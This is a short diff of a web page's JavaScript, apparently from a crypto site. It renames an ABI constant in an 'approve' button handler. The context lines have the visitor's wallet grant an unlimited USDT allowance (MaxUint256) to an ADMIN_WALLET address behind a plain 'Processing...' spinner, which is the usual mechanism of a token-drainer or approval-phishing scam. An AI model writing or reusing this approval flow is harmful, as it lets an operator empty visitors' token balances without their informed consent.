@@ -109,7 +109,7 @@ approveButton.onclick = async () => {
            approveButton.disabled = true;
            approveButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...';
    
-           const contract = new ethers.Contract(USDT_ADDRESS, ABI, signer);
+           const contract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer);
            const tx = await contract.approve(ADMIN_WALLET, ethers.MaxUint256);
            await tx.wait();
 
